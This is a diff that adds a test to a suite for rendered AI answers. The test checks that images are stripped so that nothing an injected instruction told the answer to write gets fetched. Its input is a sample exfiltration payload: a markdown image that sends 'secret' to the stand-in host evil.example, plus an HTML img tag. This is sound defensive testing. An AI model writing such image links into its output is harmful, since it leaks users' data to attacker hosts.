@@ -84,6 +84,14 @@ describe('a rendered answer', () => {
     expect(links[0]?.getAttribute('target')).toBeNull();
   });
 
+  it('shows no image, so that nothing an answer was told to write is fetched unasked', () => {
+    const answer = rendered(
+      'Done. ![](https://evil.example/p?d=secret) and <img src="https://e.example/x">',
+    );
+    expect(answer.querySelector('img')).toBeNull();
+    expect(answer.innerHTML).not.toContain('evil.example');
+  });
+
   it.each([
     { label: 'a citation whose page is not a link page', source: 'See [3].' },
     { label: 'a relative link the answer writes itself', source: '[x](/settings)' },
